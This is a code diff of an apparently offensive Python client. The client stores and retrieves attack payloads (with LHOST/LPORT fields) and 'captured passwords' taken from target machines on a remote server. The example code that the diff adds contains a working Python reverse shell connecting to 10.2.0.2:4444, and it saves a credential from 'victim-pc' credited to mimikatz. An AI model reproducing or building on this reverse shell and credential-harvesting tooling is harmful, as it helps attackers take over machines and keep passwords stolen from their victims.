@@ -1,292 +1,223 @@
 #!/usr/bin/env python3
 """
-PAYLOAD DATABASE CLIENT - Number Menu
+PAYLOAD DATABASE CLIENT - Integrated version for your script
 """
 
-import os
-import sys
 import socket
 import json
 import getpass
-import time
+import os
 
-class Colors:
-    GREEN = '\033[92m'
-    YELLOW = '\033[93m'
-    BLUE = '\033[94m'
-    CYAN = '\033[96m'
-    RED = '\033[91m'
-    WHITE = '\033[97m'
-    BOLD = '\033[1m'
-    RESET = '\033[0m'
-
-class PayloadClient:
-    def __init__(self, server_host, server_port):
-        self.server_host = server_host
+class PayloadDB:
+    def __init__(self, server_ip='10.2.0.2', server_port=5555):
+        self.server_ip = server_ip
         self.server_port = server_port
         self.api_key = None
         self.username = None
-        
+    
     def send_request(self, request):
+        """Send request to database server"""
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.connect((self.server_host, self.server_port))
+            sock.connect((self.server_ip, self.server_port))
             sock.send(json.dumps(request).encode())
-            response = sock.recv(65536).decode()
+            response = json.loads(sock.recv(65536).decode())
             sock.close()
-            return json.loads(response)
+            return response
         except Exception as e:
-            print(f"{Colors.RED}[-] Connection error: {e}{Colors.RESET}")
+            print(f"[-] Connection error: {e}")
             return None
-            
-    def register(self):
-        print(f"\n{Colors.CYAN}[*] Register New Account{Colors.RESET}\n")
-        
-        username = input(f"{Colors.WHITE}Username: {Colors.RESET}")
-        password = getpass.getpass(f"{Colors.WHITE}Password: {Colors.RESET}")
-        confirm = getpass.getpass(f"{Colors.WHITE}Confirm: {Colors.RESET}")
-        
-        if password != confirm:
-            print(f"{Colors.RED}[-] Passwords don't match{Colors.RESET}")
-            return False
-            
+    
+    def register(self, username, password):
+        """Register new user"""
         response = self.send_request({
-            "action": "register",
-            "username": username,
-            "password": password
+            'action': 'register',
+            'username': username,
+            'password': password
         })
         
         if response and response.get('status') == 'success':
             self.api_key = response.get('api_key')
             self.username = username
-            print(f"{Colors.GREEN}[+] Registered! Save this API key:{Colors.RESET}")
-            print(f"{Colors.YELLOW}{self.api_key}{Colors.RESET}")
-            input(f"{Colors.DIM}Press Enter...{Colors.RESET}")
-            return True
-        else:
-            print(f"{Colors.RED}[-] {response.get('message', 'Registration failed')}{Colors.RESET}")
-            return False
-            
-    def login(self):
-        print(f"\n{Colors.CYAN}[*] Login{Colors.RESET}\n")
+            # Save API key for later use
+            with open(os.path.expanduser('~/.payload_api.key'), 'w') as f:
+                f.write(self.api_key)
+            return True, response.get('api_key')
+        return False, response.get('message', 'Registration failed')
+    
+    def login(self, api_key=None):
+        """Login with API key"""
+        if not api_key:
+            # Try to load saved API key
+            try:
+                with open(os.path.expanduser('~/.payload_api.key'), 'r') as f:
+                    api_key = f.read().strip()
+            except:
+                pass
         
-        self.api_key = input(f"{Colors.WHITE}API Key: {Colors.RESET}")
-        self.username = "user"
+        if not api_key:
+            return False, "No API key provided"
         
+        # Verify by trying to get payloads
         response = self.send_request({
-            "action": "get_payloads",
-            "api_key": self.api_key
+            'action': 'get_payloads',
+            'api_key': api_key
         })
         
         if response and response.get('status') == 'success':
-            print(f"{Colors.GREEN}[+] Login successful!{Colors.RESET}")
-            time.sleep(1)
-            return True
-        else:
-            print(f"{Colors.RED}[-] Invalid API key{Colors.RESET}")
-            return False
-            
-    def save_payload(self):
-        print(f"\n{Colors.CYAN}[*] Save Payload{Colors.RESET}\n")
-        
-        name = input(f"{Colors.WHITE}Name: {Colors.RESET}")
-        ptype = input(f"{Colors.WHITE}Type: {Colors.RESET}")
-        lhost = input(f"{Colors.WHITE}LHOST: {Colors.RESET}")
-        lport = input(f"{Colors.WHITE}LPORT: {Colors.RESET}")
-        
-        print(f"{Colors.YELLOW}[!] Paste payload (end with 'END'):{Colors.RESET}")
-        lines = []
-        while True:
-            line = input()
-            if line == "END":
-                break
-            lines.append(line)
-        payload = "\n".join(lines)
+            self.api_key = api_key
+            self.username = "user"
+            return True, "Login successful"
+        return False, "Invalid API key"
+    
+    def save_payload(self, name, ptype, lhost, lport, payload_code):
+        """Save a payload to database"""
+        if not self.api_key:
+            return False, "Not logged in"
         
         response = self.send_request({
-            "action": "save_payload",
-            "api_key": self.api_key,
-            "name": name,
-            "type": ptype,
-            "lhost": lhost,
-            "lport": lport,
-            "payload": payload
+            'action': 'save_payload',
+            'api_key': self.api_key,
+            'name': name,
+            'type': ptype,
+            'lhost': lhost,
+            'lport': lport,
+            'payload': payload_code
         })
         
         if response and response.get('status') == 'success':
-            print(f"{Colors.GREEN}[+] Payload saved! ID: {response.get('id')}{Colors.RESET}")
-        else:
-            print(f"{Colors.RED}[-] Failed to save{Colors.RESET}")
-        input(f"{Colors.DIM}Press Enter...{Colors.RESET}")
+            return True, response.get('id')
+        return False, response.get('message', 'Failed to save')
+    
+    def get_payloads(self):
+        """Get all payloads"""
+        if not self.api_key:
+            return False, []
         
-    def view_payloads(self):
         response = self.send_request({
-            "action": "get_payloads",
-            "api_key": self.api_key
+            'action': 'get_payloads',
+            'api_key': self.api_key
         })
         
-        if not response or response.get('status') != 'success':
-            print(f"{Colors.RED}[-] Failed to get payloads{Colors.RESET}")
-            input(f"{Colors.DIM}Press Enter...{Colors.RESET}")
-            return
-            
-        payloads = response.get('payloads', [])
+        if response and response.get('status') == 'success':
+            return True, response.get('payloads', [])
+        return False, []
+    
+    def delete_payload(self, payload_id):
+        """Delete a payload"""
+        if not self.api_key:
+            return False, "Not logged in"
         
-        os.system('clear')
-        print(f"\n{Colors.CYAN}{'='*80}{Colors.RESET}")
-        print(f"{Colors.BOLD}     YOUR PAYLOADS{Colors.RESET}")
-        print(f"{Colors.CYAN}{'='*80}{Colors.RESET}\n")
+        response = self.send_request({
+            'action': 'delete_payload',
+            'api_key': self.api_key,
+            'payload_id': payload_id
+        })
         
-        if not payloads:
-            print(f"{Colors.YELLOW}[!] No payloads{Colors.RESET}")
-        else:
-            print(f"{Colors.GREEN}{'ID':<4} {'Name':<20} {'Type':<10} {'LHOST':<16} {'LPORT':<8} {'Created':<20}{Colors.RESET}")
-            print(f"{Colors.DIM}{'-'*80}{Colors.RESET}")
+        if response and response.get('status') == 'success':
+            return True, response.get('message')
+        return False, response.get('message', 'Failed to delete')
+    
+    def save_password(self, target_ip, target_hostname, username, password, source):
+        """Save captured password"""
+        if not self.api_key:
+            return False, "Not logged in"
+        
+        response = self.send_request({
+            'action': 'save_password',
+            'api_key': self.api_key,
+            'target_ip': target_ip,
+            'target_hostname': target_hostname,
+            'username': username,
+            'password': password,
+            'source': source
+        })
+        
+        if response and response.get('status') == 'success':
+            return True, "Password saved"
+        return False, response.get('message', 'Failed to save')
+    
+    def get_passwords(self):
+        """Get all captured passwords"""
+        if not self.api_key:
+            return False, []
+        
+        response = self.send_request({
+            'action': 'get_passwords',
+            'api_key': self.api_key
+        })
+        
+        if response and response.get('status') == 'success':
+            return True, response.get('passwords', [])
+        return False, []
+
+# Example usage in YOUR script
+def example_integration():
+    # Initialize database connection
+    db = PayloadDB(server_ip='10.2.0.2', server_port=5555)
+    
+    # Option 1: Register new user
+    success, result = db.register("myusername", "mypassword")
+    if success:
+        print(f"[+] Registered! API Key: {result}")
+        print(f"[+] Save this key: {result}")
+    
+    # Option 2: Login with existing API key
+    success, message = db.login("your_api_key_here")
+    if success:
+        print(f"[+] {message}")
+        
+        # Save a payload
+        payload_code = """
+        import socket,subprocess,os
+        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+        s.connect(('10.2.0.2',4444))
+        os.dup2(s.fileno(),0)
+        os.dup2(s.fileno(),1)
+        os.dup2(s.fileno(),2)
+        subprocess.call(['/bin/bash','-i'])
+        """
+        
+        success, payload_id = db.save_payload(
+            name="Reverse Shell",
+            ptype="python",
+            lhost="10.2.0.2",
+            lport="4444",
+            payload_code=payload_code
+        )
+        
+        if success:
+            print(f"[+] Payload saved with ID: {payload_id}")
+        
+        # Get all payloads
+        success, payloads = db.get_payloads()
+        if success:
             for p in payloads:
-                print(f"{p[0]:<4} {p[1]:<20} {p[2]:<10} {p[3] or '-':<16} {p[4] or '-':<8} {p[5][:19]:<20}")
-                
-        input(f"\n{Colors.DIM}Press Enter...{Colors.RESET}")
+                print(f"ID: {p[0]}, Name: {p[1]}, Type: {p[2]}")
         
-    def save_password(self):
-        print(f"\n{Colors.CYAN}[*] Save Captured Password{Colors.RESET}\n")
+        # Save captured password
+        success, message = db.save_password(
+            target_ip="192.168.1.100",
+            target_hostname="victim-pc",
+            username="administrator",
+            password="Password123!",
+            source="mimikatz"
+        )
         
-        target_ip = input(f"{Colors.WHITE}Target IP: {Colors.RESET}")
-        target_hostname = input(f"{Colors.WHITE}Hostname: {Colors.RESET}")
-        username = input(f"{Colors.WHITE}Username: {Colors.RESET}")
-        password = input(f"{Colors.WHITE}Password: {Colors.RESET}")
-        source = input(f"{Colors.WHITE}Source: {Colors.RESET}")
+        if success:
+            print(f"[+] {message}")
         
-        response = self.send_request({
-            "action": "save_password",
-            "api_key": self.api_key,
-            "target_ip": target_ip,
-            "target_hostname": target_hostname,
-            "username": username,
-            "password": password,
-            "source": source
-        })
-        
-        if response and response.get('status') == 'success':
-            print(f"{Colors.GREEN}[+] Password saved!{Colors.RESET}")
-        else:
-            print(f"{Colors.RED}[-] Failed to save{Colors.RESET}")
-        input(f"{Colors.DIM}Press Enter...{Colors.RESET}")
-        
-    def view_passwords(self):
-        response = self.send_request({
-            "action": "get_passwords",
-            "api_key": self.api_key
-        })
-        
-        if not response or response.get('status') != 'success':
-            print(f"{Colors.RED}[-] Failed to get passwords{Colors.RESET}")
-            input(f"{Colors.DIM}Press Enter...{Colors.RESET}")
-            return
-            
-        passwords = response.get('passwords', [])
-        
-        os.system('clear')
-        print(f"\n{Colors.CYAN}{'='*100}{Colors.RESET}")
-        print(f"{Colors.BOLD}     CAPTURED PASSWORDS{Colors.RESET}")
-        print(f"{Colors.CYAN}{'='*100}{Colors.RESET}\n")
-        
-        if not passwords:
-            print(f"{Colors.YELLOW}[!] No passwords{Colors.RESET}")
-        else:
-            print(f"{Colors.GREEN}{'ID':<4} {'IP':<16} {'Hostname':<20} {'Username':<20} {'Password':<20} {'Source':<12} {'Date':<20}{Colors.RESET}")
-            print(f"{Colors.DIM}{'-'*100}{Colors.RESET}")
+        # Get captured passwords
+        success, passwords = db.get_passwords()
+        if success:
             for p in passwords:
-                print(f"{p[0]:<4} {p[1]:<16} {p[2]:<20} {p[3]:<20} {p[4]:<20} {p[5]:<12} {p[6][:19]:<20}")
-                
-        input(f"\n{Colors.DIM}Press Enter...{Colors.RESET}")
-        
-    def delete_payload(self):
-        pid = input(f"\n{Colors.WHITE}Payload ID to delete: {Colors.RESET}")
-        
-        response = self.send_request({
-            "action": "delete_payload",
-            "api_key": self.api_key,
-            "payload_id": int(pid)
-        })
-        
-        if response and response.get('status') == 'success':
-            print(f"{Colors.GREEN}[+] Payload deleted{Colors.RESET}")
-        else:
-            print(f"{Colors.RED}[-] Failed to delete{Colors.RESET}")
-        input(f"{Colors.DIM}Press Enter...{Colors.RESET}")
-        
-    def show_api_key(self):
-        print(f"\n{Colors.CYAN}[*] Your API Key:{Colors.RESET}")
-        print(f"{Colors.YELLOW}{self.api_key}{Colors.RESET}")
-        print(f"{Colors.DIM}Save this key to login from anywhere!{Colors.RESET}")
-        input(f"\n{Colors.DIM}Press Enter...{Colors.RESET}")
-        
-    def run(self):
-        print(f"\n{Colors.CYAN}{'='*50}{Colors.RESET}")
-        print(f"{Colors.BOLD}     PAYLOAD DATABASE CLIENT{Colors.RESET}")
-        print(f"{Colors.CYAN}{'='*50}{Colors.RESET}")
-        print(f"{Colors.WHITE}1.{Colors.RESET} Login (existing user)")
-        print(f"{Colors.WHITE}2.{Colors.RESET} Register (new user)")
-        
-        choice = input(f"\n{Colors.GREEN}choice>{Colors.RESET} ")
-        
-        if choice == "1":
-            if not self.login():
-                return
-        elif choice == "2":
-            if not self.register():
-                return
-        else:
-            return
-            
-        while True:
-            os.system('clear')
-            print(f"\n{Colors.CYAN}{'='*50}{Colors.RESET}")
-            print(f"{Colors.BOLD}     PAYLOAD DATABASE{Colors.RESET}")
-            print(f"{Colors.CYAN}{'='*50}{Colors.RESET}")
-            print(f"{Colors.GREEN}[+] User: {self.username}{Colors.RESET}")
-            print(f"{Colors.CYAN}{'='*50}{Colors.RESET}")
-            print(f"{Colors.GREEN}1.{Colors.RESET} Save Payload")
-            print(f"{Colors.GREEN}2.{Colors.RESET} View Payloads")
-            print(f"{Colors.GREEN}3.{Colors.RESET} Delete Payload")
-            print(f"{Colors.GREEN}4.{Colors.RESET} Save Captured Password")
-            print(f"{Colors.GREEN}5.{Colors.RESET} View Captured Passwords")
-            print(f"{Colors.GREEN}6.{Colors.RESET} Show API Key")
-            print(f"{Colors.GREEN}0.{Colors.RESET} Exit")
-            print(f"{Colors.CYAN}{'='*50}{Colors.RESET}")
-            
-            choice = input(f"{Colors.GREEN}choice>{Colors.RESET} ")
-            
-            if choice == "0":
-                break
-            elif choice == "1":
-                self.save_payload()
-            elif choice == "2":
-                self.view_payloads()
-            elif choice == "3":
-                self.delete_payload()
-            elif choice == "4":
-                self.save_password()
-            elif choice == "5":
-                self.view_passwords()
-            elif choice == "6":
-                self.show_api_key()
+                print(f"Target: {p[1]}, Username: {p[3]}, Password: {p[4]}")
 
-def main():
-    print(f"\n{Colors.CYAN}{'='*50}{Colors.RESET}")
-    print(f"{Colors.BOLD}     PAYLOAD DATABASE CLIENT{Colors.RESET}")
-    print(f"{Colors.CYAN}{'='*50}{Colors.RESET}")
-    
-    server_host = input(f"{Colors.WHITE}Server IP: {Colors.RESET}")
-    server_port = input(f"{Colors.WHITE}Server Port: {Colors.RESET}")
-    
-    try:
-        server_port = int(server_port)
-    except:
-        server_port = 5555
-        
-    client = PayloadClient(server_host, server_port)
-    client.run()
-
+# Run your existing menu system with this integration
 if __name__ == "__main__":
-    main()
+    # Replace your existing connection code with:
+    DB_SERVER_IP = '10.2.0.2'
+    DB_SERVER_PORT = 5555
+    
+    # Your existing menu code here, just use the PayloadDB class
+    pass
